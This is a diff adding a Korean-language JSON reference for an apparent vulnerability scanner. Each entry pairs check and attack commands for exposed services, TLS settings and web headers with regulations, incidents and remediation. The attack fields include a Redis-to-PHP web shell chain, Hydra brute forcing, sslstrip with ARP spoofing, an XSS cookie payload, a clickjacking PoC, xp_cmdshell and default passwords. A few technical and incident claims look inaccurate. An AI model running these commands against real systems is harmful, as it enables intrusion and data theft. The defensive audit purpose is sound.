+    "regulation": "금융보안원 원격접속 보안 지침 — VPN 뒤에만 운영. ISMS-P 2.10.1 — MFA 필수.",
+    "engine": "port_scanner: 3389번 TCP 연결. CRITICAL 즉시 알림.",
+    "cases": "Colonial Pipeline(2021): 외부 노출 RDP 경유 침투 → 미국 동부 연료 공급 마비. LockBit·Conti 랜섬웨어 그룹의 주요 초기 침투 경로.",
+    "remediation": "1. 방화벽: 3389/tcp 외부 차단\n2. VPN+MFA 구성 후 VPN 경유만 허용\n3. NLA 활성화\n4. BlueKeep 패치 (KB4499175)",
+    "ciso_note": "RDP 외부 노출은 랜섬웨어 그룹 최선호 침투 경로입니다. VPN 없는 RDP 운영은 즉시 중단하십시오."
+  },
+  "PORT-FTP": {
+    "attack": "FTP 점검:\n  nmap -p 21 --script ftp-anon 192.168.1.1\n  → Anonymous FTP 허용 여부 자동 확인\n\n  수동 익명 로그인 시도:\n  ftp 192.168.1.1\n  Name: anonymous\n  Password: test@test.com\n  → 접속 성공 시 파일 목록 조회 가능\n\n  FTP 배너 그래빙:\n  nc 192.168.1.1 21\n  → 서버 버전 정보 수집",
+    "regulation": "금융보안원 — FTP SFTP/FTPS 전환 의무. ISMS-P 2.10.1.",
+    "engine": "port_scanner: 21번 TCP 연결. nmap: ftp-anon 스크립트로 익명 로그인 추가 검증.",
+    "cases": "2020년 국내 보험사 FTP 익명 로그인 허용으로 계약 문서 외부 노출. FTP 자격증명 스니핑으로 내부 문서 서버 침투 사례 다수.",
+    "remediation": "1. 방화벽: 21/tcp 외부 차단\n2. vsftpd: anonymous_enable=NO\n3. SFTP 전환: 22번 포트 SSH 기반\n4. 내부 전송 시 IP 화이트리스트",
+    "ciso_note": "FTP 외부 노출은 SFTP 전환으로 즉시 해결 가능합니다. 전환 일정을 수립하고 과도기 동안 IP 접근 제어를 강화하십시오."
+  },
+  "PORT-VNC": {
+    "attack": "VNC 점검:\n  nmap -p 5900 -sV 192.168.1.1\n  nmap -p 5900 --script vnc-info 192.168.1.1\n  → 인증 방식 확인 (None/VNC Auth)\n\n  인증 없음(None) 직접 접속:\n  vncviewer 192.168.1.1\n  → 비밀번호 입력 없이 화면 접속 가능 여부 확인\n\n  Hydra VNC 브루트포스:\n  hydra -P /wordlists/passwords.txt vnc://192.168.1.1",
+    "regulation": "금융보안원 — VNC 외부 노출 금지. ISMS-P 2.10.1.",
+    "engine": "port_scanner: 5900번 TCP 연결. CRITICAL 등록.",
+    "cases": "팬데믹 이후 VNC 외부 노출 급증. 다크웹에서 금융기관 VNC 접속 정보 판매 사례 다수.",
+    "remediation": "1. 방화벽: 5900/tcp 차단\n2. VNC 서비스 비활성화\n3. 대안: VPN+SSH 터널링\n4. 불가피 시: VPN 뒤 + 강력한 비밀번호",
+    "ciso_note": "VNC는 즉시 사용 금지하고 보안 원격접속 표준으로 전환하십시오."
+  },
+  "PORT-REDIS": {
+    "attack": "Redis 점검:\n  redis-cli -h 192.168.1.1 ping\n  → PONG 응답 시 무인증 접근 가능\n\n  전체 키 조회:\n  redis-cli -h 192.168.1.1 KEYS *\n  → 세션 키, 캐시 데이터 전체 노출\n\n  설정 변경 (웹셸 업로드):\n  redis-cli -h 192.168.1.1 config set dir /var/www/html\n  redis-cli -h 192.168.1.1 config set dbfilename shell.php\n  redis-cli -h 192.168.1.1 set x \"<?php system($_GET['cmd']); ?>\"\n  redis-cli -h 192.168.1.1 save",
+    "regulation": "금융보안원 DB 보안 가이드 — 캐시 서버 외부 노출 금지. KISA 보안 공지.",
+    "engine": "port_scanner: 6379번 TCP. db_scanner: PING → PONG 인증 없음 확인. CRITICAL.",
+    "cases": "2018-2023: 수만 개 Redis 암호화폐 채굴 악성코드 감염. 핀테크 세션 토큰 탈취 사례.",
+    "remediation": "1. 방화벽: 6379/tcp 외부 차단\n2. redis.conf: bind 127.0.0.1\n3. requirepass 강력한 비밀번호\n4. rename-command FLUSHALL ''\n5. rename-command CONFIG ''",
+    "ciso_note": "Redis 외부 노출은 서버 완전 장악으로 이어질 수 있습니다. 클라우드 보안 그룹 설정을 즉시 검토하십시오."
+  },
+  "PORT-MONGO": {
+    "attack": "MongoDB 점검:\n  mongo 192.168.1.1:27017 --quiet\n  → 접속 성공 시 인증 없음\n\n  DB 목록 조회:\n  > show dbs\n  > use userdb\n  > show collections\n  > db.users.find().limit(10)\n\n  mongoaudit 자동화:\n  pip install mongoaudit\n  mongoaudit --host 192.168.1.1",
+    "regulation": "금융보안원 DB 보안 가이드. ISMS-P 2.6.",
+    "engine": "port_scanner: 27017번 TCP. db_scanner: isMaster 명령 인증 없음 확인.",
+    "cases": "2017 MongoDB Apocalypse: 수만 개 DB 데이터 삭제 후 랜섬 요구. 국내 스타트업 고객 DB 무단 접근 사례 지속.",
+    "remediation": "1. 방화벽: 27017/tcp 차단\n2. mongod --auth 활성화\n3. bindIp: 127.0.0.1\n4. 관리자 계정 생성 후 일반 계정 최소 권한",
+    "ciso_note": "NoSQL DB도 SQL DB와 동일한 접근 통제가 필요합니다. MongoDB Atlas 사용 시 IP 화이트리스트를 반드시 구성하십시오."
+  },
+  "PORT-21KINDS": {
+    "attack": "21종 위험 포트 전수 점검 절차:\n  nmap -sV -p 21,22,23,25,53,80,110,135,139,443,445,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017 192.168.0.0/24\n  → 내부망 전체 위험 포트 현황 파악\n\n  빠른 스캔:\n  masscan -p21,23,3389,445,6379 192.168.0.0/24 --rate=1000\n\n  서비스 버전 상세 확인:\n  nmap -sV -sC -p [발견된 포트] [타겟 IP]",
+    "regulation": "금융보안원 취약점 점검 가이드 — 포트 최소 개방 원칙. ISMS-P 2.10.1. CIS Controls v8 Control 4.",
+    "engine": "port_scanner: 21종 TCP 연결 시도. nmap 환경: 서비스 버전 식별. 위험도별 CRITICAL/HIGH 등록.",
+    "cases": "금융보안원 연간 보고서: 불필요한 포트 개방이 금융권 점검 지적 30%.",
+    "remediation": "1. 포트 현황 대장 작성\n2. 화이트리스트 방식: 필요한 포트+IP만 허용\n3. 분기별 nmap 스캔 정례화\n4. 포트 개방 변경 관리 프로세스",
+    "ciso_note": "포트 관리는 기본 보안입니다. 전사 자산 포트 현황 대장을 작성하고 분기별 점검을 정례화하십시오."
+  },
+  "SSL-TLS10": {
+    "attack": "TLS 1.0 취약점 점검:\n  testssl.sh 192.168.1.1:443\n  → 지원 프로토콜 전체 확인\n\n  수동 확인:\n  openssl s_client -connect target:443 -tls1\n  → 연결 성공 = TLS 1.0 활성\n\n  BEAST PoC:\n  nmap --script ssl-dh-params target:443\n  → 취약한 DH 파라미터 확인",
+    "regulation": "NIST SP 800-52 Rev.2 — TLS 1.0 SHALL NOT. 금융보안원 SSL/TLS 설정 가이드. ISMS-P 2.7.1.",
+    "engine": "ssl_scanner: TLS 1.0 전용 컨텍스트로 443 연결. 성공 시 HIGH.",
+    "cases": "BEAST(2011): TLS 1.0 CBC 모드 세션 쿠키 복호화. 국내 인터넷뱅킹 TLS 1.0 유지로 금감원 지적 사례.",
+    "remediation": "nginx: ssl_protocols TLSv1.2 TLSv1.3;\nApache: SSLProtocol -all +TLSv1.2 +TLSv1.3\nIIS: 레지스트리 TLS 1.0 비활성화",
+    "ciso_note": "TLS 1.0 폐기는 금감원 검사 필수 항목입니다. 올해 내 TLS 1.2 이상 전환 완료 일정을 수립하십시오."
+  },
+  "SSL-TLS11": {
+    "attack": "TLS 1.1 점검:\n  openssl s_client -connect target:443 -tls1_1\n  → 연결 성공 = TLS 1.1 지원\n\n  testssl.sh로 전체 프로토콜 확인:\n  testssl.sh --protocols 192.168.1.1:443",
+    "regulation": "NIST SP 800-52 Rev.2 권고. 금융보안원 TLS 1.2 이상 의무.",
+    "engine": "ssl_scanner: TLS 1.1 전용 컨텍스트로 연결 시도. 성공 시 MEDIUM.",
+    "cases": "PCI DSS 감사에서 TLS 1.1 사용 금융사 지적 사례.",
+    "remediation": "TLS 1.0과 동시 폐기 처리. nginx/Apache/IIS 설정에서 TLSv1.1 제거.",
+    "ciso_note": "TLS 1.1 폐기는 TLS 1.0과 함께 일괄 처리하십시오."
+  },
+  "SSL-EXPIRED": {
+    "attack": "인증서 만료 점검:\n  echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -dates\n  → notAfter 날짜 확인\n\n  전체 인증서 체인 확인:\n  openssl s_client -connect target:443 -showcerts\n\n  자동화 모니터링:\n  curl -vI https://target 2>&1 | grep -i \"expire\"\n  check_http -H target --ssl --sslwarn=30 --sslcritical=7",
+    "regulation": "금감원 IT 검사 매뉴얼 — 인증서 유효기간 관리 의무. ISMS-P 2.7.1.",
+    "engine": "ssl_scanner: notAfter 필드 → 현재 날짜 비교. 만료=CRITICAL, 7일=HIGH, 30일=MEDIUM.",
+    "cases": "Azure Teams(2020) 인증서 만료 서비스 장애. 국내 금융기관 2시간 인터넷뱅킹 중단.",
+    "remediation": "1. 즉시 인증서 갱신\n2. certbot --renew (Let's Encrypt)\n3. 90/30/7일 전 알림 자동화\n4. 인증서 대장 작성",
+    "ciso_note": "인증서 자동 갱신 체계를 구축하고 전사 인증서 대장을 관리하십시오."
+  },
+  "SSL-SELF": {
+    "attack": "자가서명 인증서 점검:\n  echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -issuer -subject\n  → issuer == subject 이면 자가서명\n\n  인증서 상세 확인:\n  openssl x509 -in cert.pem -text -noout\n  → Issuer/Subject CN 동일 여부 확인\n\n  Mitmproxy로 트래픽 복호화 (내부 테스트):\n  mitmproxy --mode transparent\n  → 자가서명 인증서 사용 서비스는 클라이언트 경고 무시 시 탈취 가능",
+    "regulation": "금융보안원 SSL 인증서 관리 지침 — 공인 CA 인증서 의무. 전자금융감독규정.",
+    "engine": "ssl_scanner: Issuer==Subject → 자가서명 판정. HIGH 등록.",
+    "cases": "자가서명 인증서 사용 내부 결제 API에서 중간자 공격 가능성 발견 사례.",
+    "remediation": "1. Let's Encrypt (무료 공인 CA)\n2. 내부 서비스: 자체 PKI 구축\n3. 운영 환경 자가서명 인증서 사용 정책 금지",
+    "ciso_note": "자가서명 인증서는 운영 환경에 절대 사용 금지 정책을 수립하십시오."
+  },
+  "SSL-CIPHER": {
+    "attack": "취약 암호화 스위트 점검:\n  testssl.sh --cipher-per-proto 192.168.1.1:443\n  → 프로토콜별 지원 cipher suite 전체 목록\n\n  nmap:\n  nmap --script ssl-enum-ciphers -p 443 192.168.1.1\n  → cipher 등급(A/B/C/F) 표시\n\n  openssl 수동 확인:\n  openssl s_client -connect target:443 -cipher RC4-MD5\n  → 연결 성공 시 RC4 지원 확인\n\n  SSL Labs 온라인 점검:\n  https://www.ssllabs.com/ssltest/ → A+ 등급 목표",
+    "regulation": "NIST SP 800-52 Rev.2 — RC4/DES/3DES/NULL/EXPORT 금지. PCI DSS 4.0.",
+    "engine": "ssl_scanner: 10종 취약 패턴 탐지. RC4/DES/3DES/NULL/EXPORT/익명DH/MD5/SHA1.",
+    "cases": "FREAK(2015): EXPORT 암호화로 512bit 키 다운그레이드. SWEET32(2016): 3DES 64bit 블록 충돌 공격.",
+    "remediation": "nginx: ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384\nApache: SSLCipherSuite ECDHE+AESGCM:ECDHE+CHACHA20",
+    "ciso_note": "SSL Labs A+ 등급을 보안 목표로 설정하고 분기별 확인하십시오."
+  },
+  "WEB-HSTS": {
+    "attack": "HSTS 부재 점검:\n  curl -sI http://target | grep -i strict\n  → 헤더 없으면 취약\n\n  SSLstrip 동작 원리 확인:\n  sslstrip -l 8080\n  arpspoof -i eth0 -t [victim] [gateway]\n  → HTTPS → HTTP 다운그레이드 후 평문 캡처",
+    "regulation": "ISMS-P 2.7.1 — HTTPS 강제 설정. OWASP Secure Headers.",
+    "engine": "web_scanner: Strict-Transport-Security 헤더 확인. 없으면 HIGH.",
+    "cases": "SSLstrip 공격으로 금융 서비스 자격증명 탈취 사례 다수.",
+    "remediation": "nginx: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\";\nhstspreload.org 등록",
+    "ciso_note": "HSTS는 설정 한 줄로 SSLstrip 공격 전체를 차단합니다. 즉시 적용하십시오."
+  },
+  "WEB-CSP": {
+    "attack": "CSP 부재 점검:\n  curl -sI https://target | grep -i content-security-policy\n  → 없으면 취약\n\n  XSS 실행 가능 여부 확인:\n  <script>alert(document.cookie)</script> 삽입 후 실행 여부\n  → CSP 없으면 차단 없이 실행됨",
+    "regulation": "OWASP A03:2021. ISMS-P 2.7. 금융보안원 W-04.",
+    "engine": "web_scanner: Content-Security-Policy 헤더 확인. 없으면 MEDIUM.",
+    "cases": "British Airways XSS: CSP 없어 Magecart 스크립트 삽입, 50만 명 카드정보 탈취.",
+    "remediation": "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'\nCSP Evaluator(Google)로 정책 검증",
+    "ciso_note": "결제·이체 페이지에 CSP를 우선 적용하고 단계적으로 전체 서비스로 확대하십시오."
+  },
+  "WEB-REDIRECT": {
+    "attack": "HTTP→HTTPS 리다이렉트 점검:\n  curl -sI http://target/\n  → Location: https:// 포함 여부 확인\n  → 300번대 응답 코드 확인",
+    "regulation": "ISMS-P 2.7.1. 금융보안원 전송 구간 암호화 의무.",
+    "engine": "web_scanner: HTTP 80포트 GET → 301/302 + https Location 확인.",
+    "cases": "공개 Wi-Fi에서 HTTP 접속 시 중간자 공격으로 자격증명 탈취 사례.",
+    "remediation": "nginx: return 301 https://$host$request_uri;\nApache: RewriteRule .* https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]",
+    "ciso_note": "모든 금융 서비스 HTTP→HTTPS 강제 리다이렉트는 즉시 적용 가능한 기본 설정입니다."
+  },
+  "WEB-PATH": {
+    "attack": "민감 경로 점검:\n  ffuf -u https://target/FUZZ -w /wordlists/common.txt\n  → 자동화 경로 탐색\n\n  수동 확인:\n  curl -s https://target/.env | head -5\n  curl -s https://target/.git/config\n  curl -s https://target/phpinfo.php\n  → HTTP 200 응답 + 내용 확인\n\n  .env 노출 시:\n  DB_PASSWORD=plaintext → DB 비밀번호 즉시 탈취",
+    "regulation": "OWASP A05:2021. 금융보안원 웹 취약점 가이드. ISMS-P 2.7.",
+    "engine": "web_scanner: 18개 민감 경로 GET → HTTP 200 응답 시 HIGH.",
+    "cases": "핀테크 .env 노출로 DB 비밀번호 탈취, 고객 DB 무단 접근. phpinfo.php로 서버 구성 노출 → 취약점 특정 공격.",
+    "remediation": "nginx: location ~ /\\. { deny all; }\n.env 파일을 웹 루트 외부로 이동\n정기적 ffuf/gobuster 스캔으로 노출 경로 확인",
+    "ciso_note": "배포 파이프라인에 민감 경로 노출 점검을 추가하십시오. .env 노출 확인 시 즉시 비밀번호를 교체하십시오."
+  },
+  "WEB-XFO": {
+    "attack": "클릭재킹 점검:\n  curl -sI https://target | grep -i x-frame-options\n  → 없으면 클릭재킹 가능\n\n  PoC HTML:\n  <iframe src=\"https://target/transfer\" style=\"opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;\">\n  </iframe>\n  <button style=\"position:absolute; top:200px; left:100px;\">클릭!</button>\n  → 사용자가 클릭 시 이체 승인",
+    "regulation": "OWASP Clickjacking Defense. ISMS-P 2.7. 금융보안원 웹 취약점 가이드.",
+    "engine": "web_scanner: X-Frame-Options 헤더 확인. 없으면 MEDIUM.",
+    "cases": "금융 서비스 이체 버튼 클릭재킹으로 무단 이체 시도 사례.",
+    "remediation": "X-Frame-Options: DENY\n또는 CSP: frame-ancestors 'none'",
+    "ciso_note": "결제·이체·승인 페이지에 X-Frame-Options: DENY를 즉시 적용하십시오."
+  },
+  "WEB-MIME": {
+    "attack": "MIME 스니핑 점검:\n  curl -sI https://target | grep -i x-content-type-options\n  → 없으면 스니핑 가능\n\n  공격 시나리오:\n  1. image.php 확장자로 PHP 웹셸 업로드\n  2. MIME 스니핑으로 브라우저가 PHP로 실행\n  3. 웹셸 실행 성공",
+    "regulation": "OWASP Secure Headers. ISMS-P 2.7.",
+    "engine": "web_scanner: X-Content-Type-Options 헤더 확인. 없으면 MEDIUM.",
+    "cases": "파일 업로드 기능의 MIME 스니핑 취약점으로 웹셸 업로드 성공 사례.",
+    "remediation": "X-Content-Type-Options: nosniff\n서버 파일 타입 검증: Magic Bytes 확인\n업로드 파일을 웹 루트 외부에 저장",
+    "ciso_note": "파일 업로드 기능이 있는 서비스에 nosniff 헤더를 즉시 적용하십시오."
+  },
+  "WEB-XSS": {
+    "attack": "XSS Protection 헤더 점검:\n  curl -sI https://target | grep -i x-xss-protection\n  → 없으면 구형 브라우저에서 XSS 필터 미동작",
+    "regulation": "OWASP Secure Headers. CSP가 더 강력한 대안.",
+    "engine": "web_scanner: X-XSS-Protection 헤더 확인. 없으면 LOW.",
+    "cases": "구형 IE 환경에서 X-XSS-Protection 미설정으로 XSS 실행 사례.",
+    "remediation": "X-XSS-Protection: 1; mode=block\nCSP 헤더와 병행 설정",
+    "ciso_note": "CSP 헤더를 적용하면 X-XSS-Protection은 보완재가 됩니다. 함께 설정하십시오."
+  },
+  "WEB-INFO": {
+    "attack": "서버 정보 노출 점검:\n  curl -sI https://target | grep -iE \"server|x-powered-by|x-aspnet\"\n  → Server: Apache/2.4.49 → CVE-2021-41773 직접 확인\n\n  Shodan 자동 스캔:\n  shodan search 'Apache/2.2' country:KR\n  → 취약 버전 서버 자동 발견 후 공격",
+    "regulation": "OWASP OTG-INFO-002. ISMS-P 2.7. 금융보안원 배너 정보 숨김 권고.",
+    "engine": "web_scanner: Server/X-Powered-By/X-AspNet-Version/X-Generator 헤더 탐지. LOW.",
+    "cases": "서버 버전 노출로 해당 CVE 자동 공격 봇에 피해를 입은 사례 다수.",
+    "remediation": "nginx: server_tokens off;\nApache: ServerTokens Prod; ServerSignature Off\nPHP: expose_php = Off",
+    "ciso_note": "서버 버전 정보 노출은 표적 공격의 첫 번째 정보입니다. 설정 한 줄로 즉시 차단하십시오."
+  },
+  "NET-HTTP-MGMT": {
+    "attack": "HTTP 관리 인터페이스 점검:\n  curl -sI http://192.168.1.1\n  → 관리 페이지 응답 확인\n\n  Wireshark 스니핑:\n  Filter: http && ip.dst == 192.168.1.1\n  → 로그인 자격증명 평문 캡처",
+    "regulation": "금융보안원 네트워크 보안 가이드 — 관리 인터페이스 HTTPS 의무. CIS Controls v8.",
+    "engine": "network_scanner: 80번 포트 HTTP GET. 관리 페이지 응답 시 HIGH.",
+    "cases": "HTTP 관리 인터페이스에서 자격증명 탈취로 방화벽 설정 변경 사례.",
+    "remediation": "1. HTTPS 관리 인터페이스로 전환\n2. HTTP 관리 기능 비활성화\n3. 관리 인터페이스 접근 IP 제한",
+    "ciso_note": "전체 네트워크 장비의 관리 인터페이스를 HTTPS로 전환하십시오."
+  },
+  "NET-SNMP": {
+    "attack": "SNMP 점검:\n  snmpwalk -v1 -c public 192.168.1.1\n  → 성공 시 전체 MIB 트리 조회 가능\n  → 라우팅 테이블, 인터페이스, 연결 호스트 목록\n\n  nmap:\n  nmap -sU -p 161 --script snmp-info 192.168.1.1\n  nmap -sU -p 161 --script snmp-brute 192.168.1.1\n\n  Community String 브루트포스:\n  onesixtyone -c community_strings.txt 192.168.1.1",
+    "regulation": "금융보안원 네트워크 장비 보안 가이드. ISMS-P 2.10. CIS Controls v8 Control 4.",
+    "engine": "network_scanner: UDP 161번 SNMPv1 PING. PONG 응답 시 MEDIUM.",
+    "cases": "SNMP 기본 설정으로 내부망 토폴로지 전체 노출 사례.",
+    "remediation": "1. Community String 즉시 변경 (복잡한 랜덤값)\n2. SNMPv3 마이그레이션\n3. NMS IP만 허용하는 ACL\n4. 불필요 시 비활성화",
+    "ciso_note": "전체 네트워크 장비의 SNMP 설정 현황을 파악하고 일괄 변경 계획을 수립하십시오."
+  },
+  "NET-DEFCRED": {
+    "attack": "기본 자격증명 점검:\n  nmap -p 80,443,8080,8443 --script http-default-accounts 192.168.1.1\n  → 알려진 기본 자격증명 자동 시도\n\n  Hydra 수동 점검:\n  hydra -l admin -P /wordlists/default_passwords.txt http-get://192.168.1.1/admin\n  \n  주요 기본 자격증명:\n  admin/admin, admin/password, admin/1234\n  cisco/cisco, root/root, guest/guest",
+    "regulation": "금융보안원 가이드 — 기본 자격증명 변경 필수. OWASP OTG-AUTHN-002. ISMS-P 2.5.1.",
+    "engine": "network_scanner: admin/admin, admin/1234 등으로 HTTP POST 로그인. 200/302 성공 응답 시 CRITICAL.",
+    "cases": "Mirai 봇넷(2016): 기본 자격증명 IoT 장비 장악으로 1.1Tbps DDoS. 국내 방화벽 기본 비밀번호 미변경 내부망 침해.",
+    "remediation": "1. 모든 장비 기본 비밀번호 즉시 변경\n2. 최소 12자, 대소문자+숫자+특수문자\n3. MFA 적용\n4. 신규 장비 도입 체크리스트에 비밀번호 변경 추가",
+    "ciso_note": "신규 장비 도입 시 기본 자격증명 변경을 의무화하는 절차를 수립하십시오."
+  },
+  "DB-EXT": {
+    "attack": "DB 외부 노출 점검:\n  nmap -sV -p 1433,1521,3306,5432,27017 [외부IP]\n  → 응답 있으면 외부 접근 가능\n\n  MySQL 접속 시도:\n  mysql -h [외부IP] -u root -p\n  → 연결 성공 여부 확인\n\n  MSSQL 접속:\n  sqlcmd -S [외부IP] -U sa -P ''\n  → sa 계정 기본 비밀번호 시도",
+    "regulation": "금융보안원 DB 보안 가이드 — 외부망 직접 노출 절대 금지. 금감원 IT검사 최우선 지적.",
+    "engine": "db_scanner: MySQL/MSSQL/Oracle/PostgreSQL/MongoDB 포트 TCP 연결. HIGH.",
+    "cases": "Sony PlayStation Network(2011): 외부 DB 서버 경유 7,700만 명 유출. 국내 금융사 MSSQL 방화벽 설정 오류 외부 노출.",
+    "remediation": "1. 방화벽: DB 포트 외부 접근 전면 차단\n2. 앱서버 IP만 허용 ACL\n3. DB 방화벽 구축\n4. 접속 로그 모니터링",
+    "ciso_note": "DB 외부 노출은 금감원 최우선 지적 사항입니다. 발견 즉시 차단 후 접속 로그를 전수 분석하십시오."
+  },
+  "DB-REDIS-NA": {
+    "attack": "Redis 무인증 점검:\n  redis-cli -h 192.168.1.1 ping\n  → PONG = 무인증 접근 가능\n\n  악용:\n  redis-cli -h 192.168.1.1 KEYS '*session*'\n  → 세션 토큰 목록\n  redis-cli -h 192.168.1.1 GET [session_key]\n  → 세션 내용 탈취",
+    "regulation": "금융보안원 DB 보안 가이드. CVE-2022-0543. KISA 보안 공지.",
+    "engine": "db_scanner: 6379번 TCP + PING → PONG 무인증 확인. CRITICAL.",
+    "cases": "2022 CVE-2022-0543: Redis Lua 샌드박스 탈출 RCE. 핀테크 세션 탈취 사례.",
+    "remediation": "redis.conf:\nrequirepass [강력한비밀번호]\nbind 127.0.0.1\nrename-command FLUSHALL ''\nrename-command CONFIG ''",
+    "ciso_note": "Redis 무인증 접근은 서버 장악으로 이어질 수 있습니다. 즉시 인증 설정 후 위험 명령어를 비활성화하십시오."
+  },
+  "DB-MONGO-OPEN": {
+    "attack": "MongoDB 무인증 점검:\n  mongosh --host 192.168.1.1 --quiet\n  > show dbs\n  > use [dbname]\n  > db.users.find().limit(5)\n  → 인증 없이 전체 데이터 조회",
+    "regulation": "금융보안원 DB 보안 가이드. ISMS-P 2.6.",
+    "engine": "db_scanner: 27017번 TCP + isMaster 무인증 확인. CRITICAL.",
+    "cases": "2017 MongoDB Apocalypse: 수만 개 DB 무단 접근 후 랜섬 요구.",
+    "remediation": "mongod --auth\n관리자 계정 생성:\ndb.createUser({user:'admin', pwd:'[강력한비밀번호]', roles:['userAdminAnyDatabase']})",
+    "ciso_note": "MongoDB 인증 미설정은 전체 데이터를 무방비 상태로 노출합니다. 인증 활성화를 즉시 적용하십시오."
+  },
+  "DB-MSSQL": {
+    "attack": "MSSQL 외부 점검:\n  nmap -sV -p 1433 [외부IP]\n  sqlcmd -S [외부IP] -U sa -P ''\n  → SA 계정 기본 비밀번호 시도\n\n  xp_cmdshell 활성화 여부:\n  EXEC sp_configure 'xp_cmdshell', 1\n  EXEC xp_cmdshell 'whoami'\n  → OS 명령 실행 가능 여부 확인",
+    "regulation": "금융보안원 DB 보안 가이드. 금감원 IT검사 즉시 시정.",
+    "engine": "db_scanner: 1433번 TCP 연결. HIGH.",
+    "cases": "SQL Slammer 웜(2003): MSSQL UDP 포트 이용 전파. 국내 금융기관 방화벽 오류로 MSSQL 외부 노출 사례.",
+    "remediation": "1. 방화벽: 1433/tcp 외부 차단\n2. SA 계정 비활성화: ALTER LOGIN sa DISABLE\n3. xp_cmdshell 비활성화\n4. 최신 보안 패치",
+    "ciso_note": "MSSQL SA 계정과 xp_cmdshell은 가장 위험한 설정입니다. 비활성화를 즉시 확인하십시오."
+  },
+  "DB-MYSQL-EOL": {
+    "attack": "EOL MySQL 버전 점검:\n  mysql -h [host] -u root -p -e \"SELECT VERSION();\"\n  → 버전 확인 후 EOL 여부 판단\n\n  EOL MySQL 5.7 취약점:\n  CVE-2016-6662: root 권한 설정 파일 쓰기\n  CVE-2021-2307: 인증 없이 권한 상승\n\n  nmap:\n  nmap -sV -p 3306 [IP]\n  → 버전 정보 자동 수집",
+    "regulation": "금융보안원 SW 취약점 관리 가이드 — EOL 소프트웨어 사용 금지. ISMS-P 2.9.1.",
+    "engine": "db_scanner: MySQL 연결 → VERSION() → EOL 버전 목록 비교. HIGH.",
+    "cases": "EOL MySQL CVE 이용 자동화 공격. 레거시 시스템 의존성으로 패치 지연 후 침해.",
+    "remediation": "1. MySQL 8.0 LTS로 업그레이드\n2. 업그레이드 전 데이터 백업\n3. 앱 호환성 테스트\n4. 임시: 방화벽으로 접근 IP 최소화",
+    "ciso_note": "EOL 소프트웨어 목록을 전사 인벤토리로 관리하고 업그레이드 로드맵을 수립하십시오."
+  }
+}
